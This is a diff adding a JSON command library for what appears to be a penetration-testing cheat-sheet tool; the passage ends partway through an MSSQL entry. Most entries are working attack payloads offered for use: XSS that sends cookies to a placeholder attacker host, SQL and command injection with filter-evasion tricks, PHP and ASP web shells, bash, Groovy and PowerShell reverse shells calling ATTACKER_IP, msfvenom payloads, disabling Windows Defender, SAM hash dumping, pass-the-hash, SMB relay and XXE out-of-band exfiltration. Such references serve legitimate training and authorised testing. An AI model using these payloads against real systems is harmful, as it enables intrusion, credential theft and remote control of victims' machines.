@@ -1,0 +1,4172 @@
+[
+  {
+    "id": "xss",
+    "name": "XSS",
+    "color": "#00d4aa",
+    "categories": [
+      {
+        "name": "XSS Payloads",
+        "commands": [
+          {
+            "title": "Basic XSS Alert",
+            "command": "<script>alert(window.origin)</script>",
+            "description": "Simple XSS payload that triggers an alert showing window origin."
+          },
+          {
+            "title": "Plaintext Basic XSS",
+            "command": "<plaintext>",
+            "description": "Basic XSS payload using plaintext tag."
+          },
+          {
+            "title": "Print Function Payload",
+            "command": "<script>print()</script>",
+            "description": "Basic XSS payload using print function."
+          },
+          {
+            "title": "HTML Image XSS",
+            "command": "<img src='' onerror=alert(window.origin)>",
+            "description": "XSS triggered via an image HTML element's onerror attribute."
+          },
+          {
+            "title": "Change Background Color",
+            "command": "<script>document.body.style.background = '#141d2b'</script>",
+            "description": "Change the website background color using XSS."
+          },
+          {
+            "title": "Change Background Image",
+            "command": "<script>document.body.background = 'https://www.hackthebox.eu/images/logo-htb.svg'</script>",
+            "description": "Change the website background image via XSS."
+          },
+          {
+            "title": "Change Page Title",
+            "command": "<script>document.title = 'HackTheBox Academy'</script>",
+            "description": "Modify the page title using XSS."
+          },
+          {
+            "title": "Overwrite Main Body",
+            "command": "<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>",
+            "description": "Overwrite the content of the website's body."
+          },
+          {
+            "title": "Remove HTML Element",
+            "command": "<script>document.getElementById('urlform').remove();</script>",
+            "description": "Remove a specific HTML element by ID using XSS."
+          },
+          {
+            "title": "Load Remote Script",
+            "command": "<script src='http://{OUR_IP}/script.js'></script>",
+            "description": "Load an external JavaScript file from your server."
+          },
+          {
+            "title": "Steal Cookie",
+            "command": "<script>new Image().src='http://{OUR_IP}/index.php?c='+document.cookie</script>",
+            "description": "Exfiltrate cookies to your server via an image request."
+          }
+        ]
+      },
+      {
+        "name": "XSS Testing Commands",
+        "commands": [
+          {
+            "title": "Run XSStrike Scanner",
+            "command": "python xsstrike.py -u 'http://{SERVER_IP}:{PORT}/index.php?task=test'",
+            "description": "Scan a URL parameter for XSS using XSStrike."
+          },
+          {
+            "title": "Start Netcat Listener",
+            "command": "sudo nc -lvnp {PORT}",
+            "description": "Start a Netcat listener to receive incoming connections or exfiltrated data."
+          },
+          {
+            "title": "Start PHP Server",
+            "command": "sudo php -S 0.0.0.0:{PORT}",
+            "description": "Start a PHP server on all interfaces to host malicious scripts or payloads."
+          }
+        ]
+      },
+      {
+        "name": "test - meg",
+        "commands": []
+      }
+    ]
+  },
+  {
+    "id": "sqli",
+    "name": "SQLi",
+    "color": "#00d4aa",
+    "categories": [
+      {
+        "name": "Authentication Bypass",
+        "commands": [
+          {
+            "title": "Basic Bypass",
+            "command": "' OR '1'='1",
+            "description": "Simple auth bypass"
+          },
+          {
+            "title": "Comment Bypass",
+            "command": "admin'--",
+            "description": "Comment out password check"
+          },
+          {
+            "title": "Union Select",
+            "command": "' UNION SELECT NULL,NULL--",
+            "description": "Union-based injection"
+          }
+        ]
+      },
+      {
+        "name": "SQLMap",
+        "commands": [
+          {
+            "title": "Basic Scan",
+            "command": "sqlmap -u \"http://target.com/page?id=1\" --dbs",
+            "description": "Enumerate databases"
+          },
+          {
+            "title": "Dump Tables",
+            "command": "sqlmap -u \"http://target.com/page?id=1\" -D dbname --tables"
+          },
+          {
+            "title": "Dump Data",
+            "command": "sqlmap -u \"http://target.com/page?id=1\" -D dbname -T users --dump"
+          },
+          {
+            "title": "OS Shell",
+            "command": "sqlmap -u \"http://target.com/page?id=1\" --os-shell"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "web-fuzz",
+    "name": "web-Fuzz",
+    "color": "#00d4aa",
+    "categories": [
+      {
+        "name": "Gobuster",
+        "commands": [
+          {
+            "title": "Directory Scan",
+            "command": "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt"
+          },
+          {
+            "title": "With Extensions",
+            "command": "gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt"
+          },
+          {
+            "title": "VHOST Scan",
+            "command": "gobuster vhost -u http://target.com -w subdomains.txt"
+          }
+        ]
+      },
+      {
+        "name": "Ffuf",
+        "commands": [
+          {
+            "title": "Directory Fuzz",
+            "command": "ffuf -u http://target.com/FUZZ -w wordlist.txt"
+          },
+          {
+            "title": "Subdomain Fuzz",
+            "command": "ffuf -u http://[{HOST} -H \"Host: FUZZ.editor.htb\" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac"
+          },
+          {
+            "title": "POST Data",
+            "command": "ffuf -u http://target.com/login -X POST -d \"user=FUZZ&pass=FUZZ\" -w wordlist.txt"
+          }
+        ]
+      },
+      {
+        "name": "Feroxbuster",
+        "commands": [
+          {
+            "title": "simple search",
+            "command": "feroxbuster -u http://editor.htb -x html"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "command-injections",
+    "name": "Command Injections",
+    "color": "#00d4aa",
+    "categories": [
+      {
+        "name": "Injection Operators",
+        "commands": [
+          {
+            "title": "Semicolon",
+            "command": ";",
+            "description": "Executes multiple commands (Linux/Windows)"
+          },
+          {
+            "title": "New Line",
+            "command": "\\n",
+            "description": "Execute commands on a new line"
+          },
+          {
+            "title": "Background",
+            "command": "&",
+            "description": "Execute in background (second output generally shown first)"
+          },
+          {
+            "title": "Pipe",
+            "command": "|",
+            "description": "Pipe commands (second output shown)"
+          },
+          {
+            "title": "AND",
+            "command": "&&",
+            "description": "Second command executes only if first succeeds"
+          },
+          {
+            "title": "OR",
+            "command": "||",
+            "description": "Second command executes only if first fails"
+          },
+          {
+            "title": "Sub-Shell Backticks",
+            "command": "``",
+            "description": "Execute in sub-shell (Linux-only)"
+          },
+          {
+            "title": "Sub-Shell $()",
+            "command": "$()",
+            "description": "Execute in sub-shell (Linux-only)"
+          }
+        ]
+      },
+      {
+        "name": "Linux Filtered Character Bypass",
+        "commands": [
+          {
+            "title": "View Environment Variables",
+            "command": "printenv",
+            "description": "List all environment variables"
+          },
+          {
+            "title": "Tab Instead of Space",
+            "command": "%09",
+            "description": "Bypass space filtering using tab"
+          },
+          {
+            "title": "${IFS}",
+            "command": "${IFS}",
+            "description": "Replaced with space/tab; cannot be used in $()"
+          },
+          {
+            "title": "Comma Replacement",
+            "command": "{ls,-la}",
+            "description": "Commas replaced with spaces"
+          },
+          {
+            "title": "Other Characters /",
+            "command": "${PATH:0:1}",
+            "description": "Replaced with /"
+          },
+          {
+            "title": "Other Characters ;",
+            "command": "${LS_COLORS:10:1}",
+            "description": "Replaced with ;"
+          },
+          {
+            "title": "Shift Characters",
+            "command": "$(tr '!-}' '\"-~'<<<[)",
+            "description": "Shift character by one"
+          }
+        ]
+      },
+      {
+        "name": "Linux Blacklisted Command Bypass",
+        "commands": [
+          {
+            "title": "Character Insertion",
+            "command": "' or \"",
+            "description": "Use even number of quotes to bypass"
+          },
+          {
+            "title": "Special Variables",
+            "command": "$@ or \\",
+            "description": "Linux only, insert special characters"
+          },
+          {
+            "title": "Case Manipulation",
+            "command": "$(tr \"[A-Z]\" \"[a-z]\"<<<\"WhOaMi\")",
+            "description": "Execute command ignoring case"
+          },
+          {
+            "title": "Alternate Case",
+            "command": "$(a=\"WhOaMi\";printf %s \"${a,,}\")",
+            "description": "Lowercase conversion"
+          },
+          {
+            "title": "Reverse Command",
+            "command": "echo 'whoami' | rev",
+            "description": "Reverse command string"
+          },
+          {
+            "title": "Execute Reversed",
+            "command": "$(rev<<<'imaohw')",
+            "description": "Run reversed command"
+          },
+          {
+            "title": "Base64 Encode",
+            "command": "echo -n 'cat /etc/passwd | grep 33' | base64",
+            "description": "Encode command string"
+          },
+          {
+            "title": "Execute Base64",
+            "command": "bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)",
+            "description": "Execute base64 encoded string"
+          }
+        ]
+      },
+      {
+        "name": "Windows Filtered Character Bypass",
+        "commands": [
+          {
+            "title": "View Environment Variables PowerShell",
+            "command": "Get-ChildItem Env:",
+            "description": "List all environment variables"
+          },
+          {
+            "title": "Tab Instead of Space",
+            "command": "%09",
+            "description": "Bypass space filtering using tab"
+          },
+          {
+            "title": "Space Replacement CMD",
+            "command": "%PROGRAMFILES:~10,-5%",
+            "description": "Replaced with a space in CMD"
+          },
+          {
+            "title": "Space Replacement PowerShell",
+            "command": "$env:PROGRAMFILES[10]",
+            "description": "Replaced with a space in PowerShell"
+          },
+          {
+            "title": "Other Characters CMD",
+            "command": "%HOMEPATH:~0,-17%",
+            "description": "Replaced with \\ in CMD"
+          },
+          {
+            "title": "Other Characters PowerShell",
+            "command": "$env:HOMEPATH[0]",
+            "description": "Replaced with \\ in PowerShell"
+          }
+        ]
+      },
+      {
+        "name": "Windows Blacklisted Command Bypass",
+        "commands": [
+          {
+            "title": "Character Insertion",
+            "command": "' or \"",
+            "description": "Even number required"
+          },
+          {
+            "title": "CMD Only",
+            "command": "^",
+            "description": "Insert escape character for CMD"
+          },
+          {
+            "title": "Odd Case Command",
+            "command": "WhoAmi",
+            "description": "Use odd capitalization to bypass filters"
+          },
+          {
+            "title": "Reverse String",
+            "command": "\"whoami\"[-1..-20] -join ''",
+            "description": "Reverse string to bypass filters"
+          },
+          {
+            "title": "Execute Reversed",
+            "command": "iex \"$('imaohw'[-1..-20] -join '')\"",
+            "description": "Run reversed string"
+          },
+          {
+            "title": "Base64 Encode",
+            "command": "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))",
+            "description": "Encode string with base64"
+          },
+          {
+            "title": "Execute Base64",
+            "command": "iex \"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))\"",
+            "description": "Run base64 encoded string"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "file-upload",
+    "name": "File Upload Attacks",
+    "color": "#00d4aa",
+    "categories": [
+      {
+        "name": "Web Shells",
+        "commands": [
+          {
+            "title": "PHP File Read",
+            "command": "<?php echo file_get_contents('/etc/passwd'); ?>",
+            "description": "Basic PHP web shell to read local files."
+          },
+          {
+            "title": "PHP Command Execution",
+            "command": "<?php system('hostname'); ?>",
+            "description": "Execute a system command on the server."
+          },
+          {
+            "title": "PHP Web Shell",
+            "command": "<?php system($_REQUEST['cmd']); ?>",
+            "description": "Interactive PHP web shell allowing command execution via HTTP requests."
+          },
+          {
+            "title": "ASP Web Shell",
+            "command": "<% eval request('cmd') %>",
+            "description": "Basic ASP web shell to execute server commands."
+          },
+          {
+            "title": "PHP Reverse Shell",
+            "command": "msfvenom -p php/reverse_php LHOST={OUR_IP} LPORT={OUR_PORT} -f raw > reverse.php",
+            "description": "Generate a PHP reverse shell payload to connect back to attacker's machine."
+          }
+        ]
+      },
+      {
+        "name": "Bypasses",
+        "commands": [
+          {
+            "title": "Toggle Page Inspector",
+            "command": "[CTRL+SHIFT+C]",
+            "description": "Client-side bypass to inspect elements and understand restrictions."
+          },
+          {
+            "title": "Uncommon Extension",
+            "command": "shell.phtml",
+            "description": "Bypass blacklist using less common PHP extension."
+          },
+          {
+            "title": "Case Manipulation",
+            "command": "shell.pHp",
+            "description": "Bypass blacklist by changing case of file extension."
+          },
+          {
+            "title": "Double Extension",
+            "command": "shell.jpg.php",
+            "description": "Bypass whitelist by using double extension trick."
+          },
+          {
+            "title": "Reverse Double Extension",
+            "command": "shell.php.jpg",
+            "description": "Another method to bypass whitelist restrictions."
+          },
+          {
+            "title": "Character Injection",
+            "command": "%20, %0a, %00, %0d0a, /, .\\, ., …",
+            "description": "Inject special characters before/after extension to bypass restrictions."
+          }
+        ]
+      },
+      {
+        "name": "Limited Uploads & Potential Attacks",
+        "commands": [
+          {
+            "title": "XSS Upload",
+            "command": "HTML, JS, SVG, GIF",
+            "description": "Upload allowed file types that can be used for XSS attacks."
+          },
+          {
+            "title": "XXE / SSRF Upload",
+            "command": "XML, SVG, PDF, PPT, DOC",
+            "description": "Upload file types that can be abused for XML External Entity attacks or SSRF."
+          },
+          {
+            "title": "DoS Upload",
+            "command": "ZIP, JPG, PNG",
+            "description": "Upload large or malformed files to potentially cause denial-of-service."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "custom-1768840745440",
+    "name": "Common App",
+    "color": "#00d4aa",
+    "categories": [
+      {
+        "name": "Web Discovery & Recon",
+        "commands": [
+          {
+            "title": "Edit Hosts File",
+            "command": "sudo vim /etc/hosts",
+            "description": "Add hostnames for virtual host enumeration"
+          },
+          {
+            "title": "Common Web Ports Scan",
+            "command": "sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list",
+            "description": "Scan common web ports from a scope list"
+          },
+          {
+            "title": "EyeWitness Web Screenshotting",
+            "command": "eyewitness --web -x web_discovery.xml -d output_dir",
+            "description": "Capture screenshots of discovered web services"
+          },
+          {
+            "title": "Aquatone from Nmap",
+            "command": "cat web_discovery.xml | ./aquatone -nmap",
+            "description": "Web discovery and screenshotting with Aquatone"
+          },
+          {
+            "title": "Directory Brute Force",
+            "command": "gobuster dir -u http://TARGET -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt",
+            "description": "Discover hidden directories and files"
+          }
+        ]
+      },
+      {
+        "name": "WordPress",
+        "commands": [
+          {
+            "title": "WPScan Enumeration",
+            "command": "sudo wpscan --url http://TARGET --enumerate",
+            "description": "Enumerate WordPress users, plugins, and themes"
+          },
+          {
+            "title": "WPScan Password Attack",
+            "command": "sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://TARGET",
+            "description": "Bruteforce WordPress credentials via XML-RPC"
+          }
+        ]
+      },
+      {
+        "name": "Joomla",
+        "commands": [
+          {
+            "title": "Droopescan Joomla",
+            "command": "droopescan scan joomla --url http://TARGET",
+            "description": "Enumerate Joomla vulnerabilities"
+          },
+          {
+            "title": "Joomla Bruteforce",
+            "command": "sudo python3 joomla-brute.py -u http://TARGET -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr users.txt",
+            "description": "Bruteforce Joomla admin credentials"
+          }
+        ]
+      },
+      {
+        "name": "Drupal",
+        "commands": [
+          {
+            "title": "Drupal PHP Web Shell",
+            "command": "<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>",
+            "description": "Simple PHP web shell for Drupal exploitation"
+          },
+          {
+            "title": "Execute Drupal Web Shell",
+            "command": "curl -s http://TARGET/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id",
+            "description": "Execute system commands via Drupal web shell"
+          }
+        ]
+      },
+      {
+        "name": "Tomcat",
+        "commands": [
+          {
+            "title": "Tomcat Manager Bruteforce (Metasploit)",
+            "command": "auxiliary/scanner/http/tomcat_mgr_login",
+            "description": "Bruteforce Apache Tomcat Manager credentials"
+          },
+          {
+            "title": "Tomcat Manager Bruteforce (Python)",
+            "command": "python3 mgr_brute.py -U http://TARGET -P /manager -u tomcat_users.txt -p tomcat_pass.txt",
+            "description": "Bruteforce Tomcat Manager login"
+          },
+          {
+            "title": "Generate WAR Reverse Shell",
+            "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f war > shell.war",
+            "description": "Generate a JSP reverse shell WAR file"
+          },
+          {
+            "title": "Tomcat Service Enumeration",
+            "command": "nmap -sV -p 8009,8080 TARGET",
+            "description": "Enumerate Apache Tomcat and AJP services"
+          }
+        ]
+      },
+      {
+        "name": "Jenkins",
+        "commands": [
+          {
+            "title": "Linux Groovy Reverse Shell",
+            "command": "r=Runtime.getRuntime();p=r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read l; do $l 2>&5 >&5; done\"] as String[]);p.waitFor()",
+            "description": "Groovy reverse shell via Jenkins Script Console (Linux)"
+          },
+          {
+            "title": "Windows Groovy Command Execution",
+            "command": "def cmd = \"cmd.exe /c dir\".execute(); println(cmd.text)",
+            "description": "Execute commands on Windows Jenkins host"
+          }
+        ]
+      },
+      {
+        "name": "Web Shells & Payloads",
+        "commands": [
+          {
+            "title": "Execute PHP Web Shell",
+            "command": "curl -s http://TARGET/shell.php?cmd=id",
+            "description": "Execute commands via PHP web shell"
+          },
+          {
+            "title": "PHP Reverse Shell",
+            "command": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'\"); ?>",
+            "description": "PHP-based reverse shell payload"
+          },
+          {
+            "title": "Splunk Reverse Shell Package",
+            "command": "reverse_shell_splunk",
+            "description": "Obtain reverse shell on Splunk servers"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "shell",
+    "name": "Shells & Payloads",
+    "color": "#00d4aa",
+    "categories": [
+      {
+        "name": "Remote Desktop",
+        "commands": [
+          {
+            "title": "Connect via xfreerdp",
+            "command": "xfreerdp /v:{IP} /u:{USER} /p:{PASSWORD}",
+            "description": "Connect to a Windows target using RDP from CLI."
+          }
+        ]
+      },
+      {
+        "name": "Environment & Discovery",
+        "commands": [
+          {
+            "title": "Check Environment Variables",
+            "command": "env",
+            "description": "Discover system environment variables and shell language."
+          }
+        ]
+      },
+      {
+        "name": "Netcat",
+        "commands": [
+          {
+            "title": "Start Netcat Listener",
+            "command": "sudo nc -lvnp {PORT}",
+            "description": "Start a Netcat listener on a specific port."
+          },
+          {
+            "title": "Connect to Netcat Listener",
+            "command": "nc -nv {IP} {PORT}",
+            "description": "Connect to a Netcat listener at a given IP and port."
+          },
+          {
+            "title": "Bind Shell with Netcat",
+            "command": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l {IP} {PORT} > /tmp/f",
+            "description": "Bind a bash shell to a remote listener using Netcat."
+          }
+        ]
+      },
+      {
+        "name": "Powershell Reverse Shells",
+        "commands": [
+          {
+            "title": "Powershell One-Liner Reverse Shell",
+            "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+            "description": "Connect back to a listener started on an attack box using Powershell."
+          },
+          {
+            "title": "Disable Windows Defender Realtime Monitoring",
+            "command": "Set-MpPreference -DisableRealtimeMonitoring $true",
+            "description": "Disable real-time monitoring in Windows Defender using Powershell."
+          }
+        ]
+      },
+      {
+        "name": "Metasploit Exploits",
+        "commands": [
+          {
+            "title": "SMB Psexec Exploit",
+            "command": "use exploit/windows/smb/psexec",
+            "description": "Exploit Windows SMB service to get a shell session using psexec."
+          },
+          {
+            "title": "Check MS17-010 Vulnerability",
+            "command": "use auxiliary/scanner/smb/smb_ms17_010",
+            "description": "Scan target host for MS17-010 vulnerability."
+          },
+          {
+            "title": "MS17-010 Exploit",
+            "command": "use exploit/windows/smb/ms17_010_psexec",
+            "description": "Exploit MS17-010 to gain reverse shell on Windows."
+          },
+          {
+            "title": "Linux rConfig Exploit",
+            "command": "use exploit/linux/http/rconfig_vendors_auth_file_upload_rce",
+            "description": "Obtain reverse shell on a vulnerable Linux rConfig server."
+          }
+        ]
+      },
+      {
+        "name": "MSFVenom Payloads",
+        "commands": [
+          {
+            "title": "Linux Reverse Shell Payload",
+            "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf > {FILE}.elf",
+            "description": "Generate a Linux stageless reverse shell payload."
+          },
+          {
+            "title": "Windows Reverse Shell Payload",
+            "command": "msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > {FILE}.exe",
+            "description": "Generate a Windows reverse shell payload."
+          },
+          {
+            "title": "MacOS Reverse Shell Payload",
+            "command": "msfvenom -p osx/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f macho > {FILE}.macho",
+            "description": "Generate a MacOS reverse shell payload."
+          },
+          {
+            "title": "ASP Web Reverse Shell Payload",
+            "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f asp > {FILE}.asp",
+            "description": "Generate an ASP web reverse shell payload."
+          },
+          {
+            "title": "JSP Web Reverse Shell Payload (raw)",
+            "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw > {FILE}.jsp",
+            "description": "Generate a raw JSP web reverse shell payload."
+          },
+          {
+            "title": "JSP Web Reverse Shell Payload (WAR)",
+            "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war > {FILE}.war",
+            "description": "Generate a WAR Java/JSP compatible reverse shell."
+          }
+        ]
+      },
+      {
+        "name": "Interactive Shells",
+        "commands": [
+          {
+            "title": "Python PTY Spawn",
+            "command": "python -c 'import pty; pty.spawn(\"/bin/sh\")'",
+            "description": "Spawn an interactive shell using Python on Linux."
+          },
+          {
+            "title": "Bash Interactive Shell",
+            "command": "/bin/sh -i",
+            "description": "Spawn an interactive shell on Linux."
+          },
+          {
+            "title": "Perl Shell Spawn",
+            "command": "perl -e 'exec \"/bin/sh\";'",
+            "description": "Spawn an interactive shell using Perl."
+          },
+          {
+            "title": "Ruby Shell Spawn",
+            "command": "ruby: exec \"/bin/sh\"",
+            "description": "Spawn an interactive shell using Ruby."
+          },
+          {
+            "title": "Lua Shell Spawn",
+            "command": "Lua: os.execute('/bin/sh')",
+            "description": "Spawn an interactive shell using Lua."
+          },
+          {
+            "title": "Awk Shell Spawn",
+            "command": "awk 'BEGIN {system(\"/bin/sh\")}'",
+            "description": "Spawn an interactive shell using awk."
+          },
+          {
+            "title": "Find + Awk Shell",
+            "command": "find / -name {FILE} -exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \\;",
+            "description": "Use find and awk to spawn a shell."
+          },
+          {
+            "title": "Find + Shell Spawn",
+            "command": "find . -exec /bin/sh \\; -quit",
+            "description": "Alternative find method to spawn a shell."
+          },
+          {
+            "title": "Vim Escape Shell",
+            "command": "vim -c ':!/bin/sh'",
+            "description": "Escape jailed shell using Vim to spawn shell."
+          }
+        ]
+      },
+      {
+        "name": "System Enumeration",
+        "commands": [
+          {
+            "title": "List Directory Permissions",
+            "command": "ls -la {PATH}",
+            "description": "List files and permissions in a Linux directory."
+          },
+          {
+            "title": "Check Sudo Privileges",
+            "command": "sudo -l",
+            "description": "Display commands that the current user can run as sudo."
+          }
+        ]
+      },
+      {
+        "name": "Webshell Locations",
+        "commands": [
+          {
+            "title": "Laudanum Webshells",
+            "command": "/usr/share/webshells/laudanum",
+            "description": "Location of laudanum webshells on ParrotOS or Pwnbox."
+          },
+          {
+            "title": "Antak Webshells",
+            "command": "/usr/share/nishang/Antak-WebShell",
+            "description": "Location of Antak webshells on ParrotOS or Pwnbox."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "custom-1768840387415",
+    "name": "IDOR & XXE",
+    "color": "#00d4aa",
+    "categories": [
+      {
+        "name": "HTTP Verb Tampering",
+        "commands": [
+          {
+            "title": "HEAD Method",
+            "command": "HEAD",
+            "description": "Retrieve headers without the response body"
+          },
+          {
+            "title": "PUT Method",
+            "command": "PUT",
+            "description": "Upload or overwrite a resource"
+          },
+          {
+            "title": "DELETE Method",
+            "command": "DELETE",
+            "description": "Delete a target resource"
+          },
+          {
+            "title": "OPTIONS Method",
+            "command": "OPTIONS",
+            "description": "Enumerate supported HTTP methods"
+          },
+          {
+            "title": "PATCH Method",
+            "command": "PATCH",
+            "description": "Partially modify a resource"
+          },
+          {
+            "title": "Set HTTP Method with Curl",
+            "command": "curl -X OPTIONS http://TARGET",
+            "description": "Test HTTP verb tampering using curl"
+          }
+        ]
+      },
+      {
+        "name": "IDOR (Insecure Direct Object Reference)",
+        "commands": [
+          {
+            "title": "IDOR in URL Parameters",
+            "command": "?user_id=123",
+            "description": "Manipulate object references in URL parameters"
+          },
+          {
+            "title": "IDOR in APIs",
+            "command": "/api/user/123",
+            "description": "Change object identifiers in API endpoints"
+          },
+          {
+            "title": "IDOR in AJAX Calls",
+            "command": "XHR /fetch?account=123",
+            "description": "Intercept and modify AJAX requests"
+          },
+          {
+            "title": "Reference Hashing",
+            "command": "md5sum",
+            "description": "Test predictable hashed identifiers"
+          },
+          {
+            "title": "Base64 Encoding",
+            "command": "base64",
+            "description": "Decode or encode object references"
+          },
+          {
+            "title": "Role Comparison",
+            "command": "Compare user/admin requests",
+            "description": "Identify authorization issues between roles"
+          }
+        ]
+      },
+      {
+        "name": "XXE (XML External Entity)",
+        "commands": [
+          {
+            "title": "External Entity via URL",
+            "command": "<!ENTITY xxe SYSTEM \"http://localhost/email.dtd\">",
+            "description": "Load external entity from a remote URL"
+          },
+          {
+            "title": "Read Local File",
+            "command": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
+            "description": "Read local files via XXE"
+          },
+          {
+            "title": "Read PHP Source",
+            "command": "<!ENTITY company SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">",
+            "description": "Read PHP source code using base64 filter"
+          },
+          {
+            "title": "Error-Based File Read",
+            "command": "<!ENTITY % error \"<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>\">",
+            "description": "Trigger PHP error to leak file contents"
+          },
+          {
+            "title": "OOB Exfiltration",
+            "command": "<!ENTITY % oob \"<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>\">",
+            "description": "Out-of-band file exfiltration via HTTP"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "nmap",
+    "name": "Nmap",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "Basic Scans",
+        "commands": [
+          {
+            "title": "Quick Scan",
+            "command": "nmap -sC -sV -oA nmap/initial {HOST}"
+          },
+          {
+            "title": "Full Port",
+            "command": "nmap -p- -oA nmap/allports TARGET"
+          },
+          {
+            "title": "UDP Scan",
+            "command": "nmap -sU --top-ports 100 TARGET"
+          },
+          {
+            "title": "Aggressive",
+            "command": "nmap -A -T4 TARGET"
+          }
+        ]
+      },
+      {
+        "name": "NSE Scripts",
+        "commands": [
+          {
+            "title": "Vuln Scan",
+            "command": "nmap --script vuln TARGET"
+          },
+          {
+            "title": "SMB Enum",
+            "command": "nmap --script smb-enum-shares,smb-enum-users TARGET"
+          },
+          {
+            "title": "HTTP Enum",
+            "command": "nmap --script http-enum TARGET"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "common-services",
+    "name": "Common Services",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "FTP Attacks",
+        "commands": [
+          {
+            "title": "FTP Client Connect",
+            "command": "ftp {IP}",
+            "description": "Connect to the FTP server using the FTP client."
+          },
+          {
+            "title": "FTP Connect with Netcat",
+            "command": "nc -v {IP} 21",
+            "description": "Connect to the FTP server using netcat."
+          },
+          {
+            "title": "FTP Brute Force",
+            "command": "hydra -l {USER} -P {WORDLIST} ftp://{IP}",
+            "description": "Brute-force the FTP service using Hydra."
+          }
+        ]
+      },
+      {
+        "name": "SMB Attacks",
+        "commands": [
+          {
+            "title": "Null Session with smbclient",
+            "command": "smbclient -N -L //{IP}",
+            "description": "Test null-session connection against SMB."
+          },
+          {
+            "title": "Network Share Enumeration",
+            "command": "smbmap -H {IP}",
+            "description": "Enumerate network shares with smbmap."
+          },
+          {
+            "title": "Recursive Share Enumeration",
+            "command": "smbmap -H {IP} -r {SHARE}",
+            "description": "Recursively enumerate a network share."
+          },
+          {
+            "title": "Download File from SMB",
+            "command": "smbmap -H {IP} --download \"{REMOTE_PATH}\"",
+            "description": "Download a specific file from the shared folder."
+          },
+          {
+            "title": "Upload File to SMB",
+            "command": "smbmap -H {IP} --upload {LOCAL_FILE} \"{REMOTE_PATH}\"",
+            "description": "Upload a specific file to the shared folder."
+          },
+          {
+            "title": "RPC Null Session",
+            "command": "rpcclient -U'%' {IP}",
+            "description": "Connect via RPC with null session."
+          },
+          {
+            "title": "Automated SMB Enumeration",
+            "command": "./enum4linux-ng.py {IP} -A -C",
+            "description": "Automated enumeration using enum4linux-ng."
+          },
+          {
+            "title": "SMB Password Spraying",
+            "command": "crackmapexec smb {IP} -u {USER_LIST} -p '{PASSWORD}'",
+            "description": "Perform password spraying on SMB users."
+          },
+          {
+            "title": "SMB Command Execution",
+            "command": "crackmapexec smb {IP} -u {USER} -p '{PASSWORD}' -x '{COMMAND}' --exec-method smbexec",
+            "description": "Execute a command over SMB using crackmapexec."
+          },
+          {
+            "title": "Extract SAM Hashes",
+            "command": "crackmapexec smb {IP} -u {USER} -p '{PASSWORD}' --sam",
+            "description": "Dump SAM database to extract hashes."
+          },
+          {
+            "title": "Pass-the-Hash Authentication",
+            "command": "crackmapexec smb {IP} -u {USER} -H {NT_HASH}",
+            "description": "Authenticate using NTLM hash."
+          },
+          {
+            "title": "SMB Relay",
+            "command": "impacket-ntlmrelayx --no-http-server -smb2support -t {TARGET}",
+            "description": "Perform SMB relay attack."
+          },
+          {
+            "title": "SMB Relay Reverse Shell",
+            "command": "impacket-ntlmrelayx --no-http-server -smb2support -t {TARGET} -c '{POWERSHELL_BASE64}'",
+            "description": "Execute a reverse shell using SMB relay."
+          }
+        ]
+      },
+      {
+        "name": "SQL Database Attacks",
+        "commands": [
+          {
+            "title": "Connect to MySQL",
+            "command": "mysql -u {USER} -p{PASSWORD} -h {IP}",
+            "description": "Connect to a MySQL server."
+          },
+          {
+            "title": "Connect to MSSQL",
